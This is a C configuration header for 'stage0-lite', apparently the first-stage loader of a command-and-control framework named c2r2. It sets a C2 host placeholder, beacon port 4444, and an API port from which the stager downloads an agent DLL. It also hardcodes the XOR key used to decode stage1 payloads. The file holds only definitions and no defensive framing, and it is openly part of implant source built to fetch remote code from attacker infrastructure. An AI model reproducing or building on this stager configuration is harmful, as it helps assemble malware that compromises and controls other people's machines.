#pragma once
/*
 * stage0-lite configuration
 *
 * These values are injected by the build script via -D compile flags:
 *   -DC2_HOST_STR=\"192.168.1.1\"
 *   -DC2_PORT=4444
 *
 * They can also be hardcoded below for testing.
 */

/* ---- C2 Connection ---- */
#ifndef C2_HOST_STR
#define C2_HOST_STR "CHANGEME_C2_HOST"
#endif

/* TLS port for agent beacon (not used by stage0-lite directly) */
#ifndef C2_PORT
#define C2_PORT 4444
#endif

/* HTTP port for Team Client API — stage0-lite downloads agent DLL from here */
#ifndef API_PORT
#define API_PORT 5555
#endif

/* Set to 1 to use HTTPS for the DLL download (requires HTTPS on API_PORT) */
#ifndef DOWNLOAD_USE_HTTPS
#define DOWNLOAD_USE_HTTPS 0
#endif

/* Wide-string version of host (WinHTTP uses LPCWSTR) */
/* These are built dynamically at runtime from C2_HOST_STR via mbstowcs */

/* ---- Download endpoints ---- */
#define AGENT_DLL_ENDPOINT   "/api/stage1/agent_dll"
#define AGENT_DLL_ENDPOINT_W L"/api/stage1/agent_dll"

/* ---- XOR key used by the C2 server for stage1 payloads ----
 * Must match STAGE1_AGENT_XOR_KEY in c2r2-server/src/api/handlers.rs
 * and builder/src/stage_builder.rs
 */
#define STAGE1_XOR_KEY     "C2R2_STAGE1_AGENT_KEY_2026_L1TE"
#define STAGE1_XOR_KEY_LEN 31

/* ---- Timeouts ---- */
#define HTTP_CONNECT_TIMEOUT_MS 30000
#define HTTP_RECV_TIMEOUT_MS    120000

/* ---- Max download size (debug DLL ~26 MB, release ~2 MB) ---- */
#define MAX_DOWNLOAD_BYTES (64 * 1024 * 1024)  /* 64 MB */
